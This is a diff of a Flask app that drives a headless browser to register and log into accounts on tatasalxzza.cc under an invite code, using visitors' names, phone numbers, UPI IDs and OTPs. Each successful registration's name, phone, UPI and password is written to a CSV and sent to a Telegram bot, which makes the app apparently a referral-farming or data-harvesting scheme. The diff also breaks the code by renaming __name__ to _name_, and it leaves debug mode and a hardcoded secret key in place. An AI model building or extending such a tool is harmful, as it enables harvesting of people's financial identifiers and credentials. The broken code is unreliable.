@@ -1,8 +1,8 @@
 from flask import Flask, render_template, request, redirect, url_for, session, flash
 from selenium import webdriver
-from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.common.by import By
-from webdriver_manager.chrome import ChromeDriverManager
+from selenium.webdriver.chrome.options import Options
+import chromedriver_autoinstaller
 from datetime import datetime
 import time
 import random
@@ -11,7 +11,7 @@ import os
 import requests
 import string
 
-app = Flask(__name__)
+app = Flask(_name_)
 app.secret_key = 'any_secret_key'
 
 # Telegram Bot Info
@@ -26,7 +26,16 @@ first_names = ["Vijay", "Aman", "Ravi", "Karan", "Neha"]
 last_names = ["Singh", "Sharma", "Yadav", "Verma", "Patel"]
 browser = None
 
-# 🔐 Random Password Generator
+# Get a headless browser
+def get_browser():
+    chromedriver_autoinstaller.install()
+    options = Options()
+    options.add_argument('--headless')
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-dev-shm-usage')
+    options.binary_location = '/usr/bin/chromium-browser'
+    return webdriver.Chrome(options=options)
+
 def generate_random_password():
     name = random.choice(first_names)
     digits = ''.join(random.choices(string.digits, k=4))
@@ -49,14 +58,10 @@ def send_otp():
     session['upi'] = upi
     session['name'] = name
 
-    options = webdriver.ChromeOptions()
-    options.add_argument('--disable-blink-features=AutomationControlled')
-    browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
-
+    browser = get_browser()
     browser.get("https://tatasalxzza.cc/home/register?invite=FMS4R4OI")
     time.sleep(5)
 
-    # Fill name
     browser.execute_script(f"""
         const nameInput = document.querySelector('input[name="name"]');
         if(nameInput) {{
@@ -65,7 +70,6 @@ def send_otp():
         }}
     """)
 
-    # Fill phone
     browser.execute_script(f"""
         const inputs = document.querySelectorAll('input.form-control');
         if(inputs.length > 1){{
@@ -74,7 +78,6 @@ def send_otp():
         }}
     """)
 
-    # Click Send OTP
     browser.execute_script("""
         const links = document.querySelectorAll('a');
         links.forEach(link => {
@@ -98,7 +101,6 @@ def submit_otp():
     password = generate_random_password()
 
     try:
-        # Fill OTP
         browser.execute_script(f"""
             const inputs = document.querySelectorAll('input.form-control');
             if(inputs.length > 2) {{
@@ -108,7 +110,6 @@ def submit_otp():
         """)
         time.sleep(5)
 
-        # Fill Password using name attribute
         browser.execute_script(f"""
             const passwordField = document.querySelector('input[name="password"]');
             if (passwordField) {{
@@ -118,7 +119,6 @@ def submit_otp():
         """)
         time.sleep(5)
 
-        # Click Register
         browser.execute_script("""
             const btn = document.querySelector('button#create-account-btn');
             if (btn && btn.getAttribute('onclick') === 'verifyOTP()') {
@@ -127,11 +127,9 @@ def submit_otp():
         """)
         time.sleep(6)
 
-        # ✅ Attempt Login
         browser.get("https://tatasalxzza.cc/home/login")
         time.sleep(4)
 
-        # Fill phone
         browser.execute_script(f"""
             const phoneInput = document.querySelector('input[name="phone"]');
             if(phoneInput) {{
@@ -141,7 +139,6 @@ def submit_otp():
         """)
         time.sleep(1)
 
-        # Fill password
         browser.execute_script(f"""
             const passInput = document.querySelector('input[name="password"]');
             if(passInput) {{
@@ -151,25 +148,20 @@ def submit_otp():
         """)
         time.sleep(1)
 
-        # Click login
         browser.execute_script("""
             const btn = document.querySelector('#sign_btn');
             if(btn) btn.click();
         """)
         time.sleep(5)
 
-        # ✅ Final Check
         page_source = browser.page_source
 
         if 'onclick="closeModal()"' in page_source or "Logout" in page_source:
             result = "success"
-
-            # Save to CSV
             with open("data.csv", "a", newline='') as file:
                 writer = csv.writer(file)
                 writer.writerow([name, phone, upi, password, datetime.now().strftime("%Y-%m-%d %H:%M:%S")])
 
-            # Telegram alert
             message = f"✅ New Registration:\n👤 Name: {name}\n📱 Phone: {phone}\n💸 UPI: {upi}\n🔑 Password: {password}"
             requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
                 "chat_id": CHAT_ID,
@@ -190,8 +182,6 @@ def submit_otp():
     finally:
         if browser:
             browser.quit()
-
-# --------------------- ADMIN PANEL ---------------------
 
 @app.route('/admin', methods=['GET', 'POST'])
 def admin_login():
@@ -221,6 +211,6 @@ def logout():
     session.pop('admin', None)
     return redirect(url_for('admin_login'))
 
-if __name__ == '__main__':
- port = int(os.environ.get("PORT", 5000))
-app.run(host="0.0.0.0", port=port,debug=True)
+if _name_ == '_main_':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=True)
